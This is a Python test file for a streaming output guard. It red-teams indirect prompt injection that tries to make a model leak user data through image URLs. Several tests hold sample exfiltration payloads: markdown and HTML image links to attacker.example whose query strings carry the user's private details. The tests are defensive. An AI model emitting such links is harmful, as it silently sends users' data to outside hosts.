"""Red-team tests: indirect prompt injection that tries to exfiltrate data through image URLs."""

import random

import pytest

from backend.services.output_guard import (
    StreamingImageGuard,
    allowed_image_urls,
    sanitize_markdown_images,
)

OWN_FIGURE = "https://cdn.example-user-bucket.test/figs/attention.png"
CHUNKS = [
    {"content": "Attention weights each token. ![Scaled dot-product attention](" + OWN_FIGURE + ")",
     "images": [{"url": "/api/images/fig-2.png", "caption": "Multi-head"}]},
]
EXFIL = "![chart](https://attacker.example/p?d=Jordan+is+weak+at+softmax)"


def stream(text: str, allowed: set[str], seed: int = 0) -> str:
    """Feed text in random token-sized pieces, as a model stream would arrive."""
    rng, guard, out, i = random.Random(seed), StreamingImageGuard(allowed), [], 0
    while i < len(text):
        n = rng.randint(1, 7)
        out.append(guard.feed(text[i:i + n]))
        i += n
    out.append(guard.finish())
    return "".join(out)


def test_allowlist_comes_from_the_users_own_retrieved_material():
    allowed = allowed_image_urls(CHUNKS)
    assert allowed == {OWN_FIGURE, "/api/images/fig-2.png"}


@pytest.mark.parametrize("seed", range(20))
def test_exfiltration_image_never_reaches_the_stream(seed):
    allowed = allowed_image_urls(CHUNKS)
    answer = f"Here is the idea [1]. {EXFIL} And more text."
    out = stream(answer, allowed, seed)
    assert "attacker.example" not in out
    assert "*chart*" in out and out.endswith("And more text.")


@pytest.mark.parametrize("seed", range(10))
def test_the_users_own_figures_still_render(seed):
    allowed = allowed_image_urls(CHUNKS)
    answer = f"See ![Scaled dot-product attention]({OWN_FIGURE}) and ![Multi-head](/api/images/fig-2.png)."
    assert stream(answer, allowed, seed) == answer


def test_html_img_tags_are_always_removed():
    allowed = allowed_image_urls(CHUNKS)
    answer = 'Text <img src="https://attacker.example/x.png?d=secret"> end'
    assert "attacker" not in stream(answer, allowed)
    assert "attacker" not in sanitize_markdown_images(answer, allowed)


def test_ordinary_exclamation_marks_and_comparisons_pass_through():
    allowed = set()
    text = "Wow! Note that 3 < 5 and x != y! <b>bold</b> stays."
    assert stream(text, allowed) == text


def test_an_unfinished_image_at_the_end_is_dropped_not_rendered():
    out = stream("Done. ![x](https://attacker.example/p?d=", set())
    assert out == "Done. "


def test_final_text_sanitiser_matches_the_stream():
    allowed = allowed_image_urls(CHUNKS)
    answer = f"A {EXFIL} B ![ok]({OWN_FIGURE})"
    assert sanitize_markdown_images(answer, allowed) == stream(answer, allowed)


def test_a_url_that_only_contains_an_allowed_one_is_rejected():
    allowed = allowed_image_urls(CHUNKS)
    sneaky = f"![x]({OWN_FIGURE}?d=secret)"
    assert "secret" not in sanitize_markdown_images(sneaky, allowed)
